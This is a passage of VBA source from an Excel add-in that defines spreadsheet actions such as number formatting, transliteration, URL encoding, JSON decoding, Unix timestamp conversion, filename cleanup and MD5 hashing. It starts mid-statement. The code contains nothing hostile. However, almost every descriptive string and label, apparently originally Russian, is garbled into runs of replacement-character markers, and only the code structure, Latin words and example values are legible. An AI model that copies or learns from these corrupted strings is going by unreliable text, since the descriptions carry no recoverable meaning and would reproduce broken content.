                            "5296274 (|fffd||fffd||fffd||fffd||fffd||fffd|)", "10066431 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"), "5296274 (|fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "FontColor", aps_Combo, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "65280 (green)", "255 (red)"), ""
        .AddParameter "ColumnCheckRules", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("", "2=|fffd||fffd||fffd||fffd|*", "1=*?.?*"), ""
    End With

    With AAs.AddAction(fc_Developer, "ApplyFormatConditions", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ApplyTo", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|", "ActionSets"
    End With

    With AAs.AddAction(fc_Developer, "DeleteFormatConditions", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    End With

End Sub

Attribute VB_Name = "mod_AAs_Encode"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Encode
' Author        : EducatedFool                     Date: 31.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Encode(ByRef AAs As ArrayActions)
    On Error Resume Next

    With AAs.AddAction(fc_EncodeAndFormat, "NumberFormat", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|79229426512|fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|+# (###) ### ####|fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|+7 (922) 942 6512|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|20 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|d.mm.yyyy|fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|20.01.2015|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| dd.mm.yyyy (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|" & _
                       "|fffd|12 |fffd||fffd||fffd| |fffd| 12:45|fffd|, |fffd|12 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2014 03:56|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| 21:40|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 5:38|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|.|fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel =|fffd||fffd||fffd||fffd||fffd|()"
        .AddParameter "Format", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd|", , "DD.MM.YYYY HH:NN"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "StrConv", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "2 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "3 - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Conversion", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1 - UpperCase", "2 - LowerCase", "3 - ProperCase"), "1 - UpperCase"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "Translit", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|. -> |fffd||fffd||fffd||fffd|.)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 123 text |fffd||fffd||fffd||fffd||fffd||fffd||fffd||4bb| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|Proverka 123 text transLIT|fffd|" & vbNewLine & _
                       "|fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|-|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: A-B-V-G-D-E-E-ZH-Z-I-Y-K-L-M-N-O-P-R-S-T-U-F-KH-TS-TCH-SH-SCH--Y--E-YU-YA"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "URLencode", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|/|fffd||fffd| URLencode")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URLencode, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|123+text :)|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|%D1%83%D1%80%D0%BB+%E2%84%96123+text+:)|fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|0|fffd|)" & vbNewLine & _
                       "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|123+text :)|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|%F3%F0%EB+%E2%84%96123+text+:)|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd|2|fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URLencode (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd|+|fffd|, |fffd| |fffd||fffd| |fffd|%20|fffd|; |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| -._~ )" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|2|fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|123+text :)|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|%D1%83%D1%80%D0%BB%20%E2%84%96123%2Btext%20%3A%29|fffd|" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|0|fffd| |fffd||fffd||fffd| |fffd|2|fffd|. |fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| Unicode)" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| -1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| URLencode |fffd| |fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd|%D1%82%E2%84%96%D0%B5%2045%2Fa%3F.%2C%D1%81%D1%82j|fffd| |fffd| |fffd||fffd||fffd| 45/a?.,|fffd||fffd|j|fffd|)"
        .AddParameter "Mode", aps_List, "|fffd||fffd||fffd||fffd||fffd|", Array("0", "1", "2", "-1"), "2"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "JSON_decode", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd|\u0428\u0442\u0440\u0438\u0445\u043a\u043e\u0434|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_UNUSED, "DateTimeFromUnixFormat", "# |fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| UNIX")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| UNIX timestamp (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1970 |fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd|1184112123|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|11.07.2007 00:02:03|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd|dd.mm.yyyy hh:mm:ss|fffd|"
        .AddParameter "Format", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "dd.mm.yyyy hh:nn:ss"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "UnixTimestamp", "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| UNIX")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| UNIX timestamp (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1970 |fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| 1184112123 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|11.07.2007 00:02:03|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd|13.11.2018 21:25:30|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| 1542144330"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "JSON2XML", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd| XML")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| XML (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| JSON, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| XML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| qq_ (|fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)"
    End With
    
    With AAs.AddAction(fc_EncodeAndFormat, "RTF2HTML", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| RTF |fffd| HTML")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| RTF (Rich TextFormat) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer."
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "CorrectFilename", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: ~!@/:\#$%^&*=|`""<>" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Replacement", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", , "_"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "MD5", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MD5 |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MD5 |fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|608333adc72f545078ede3aad71bfe74|fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| .NET Framework"
    End With

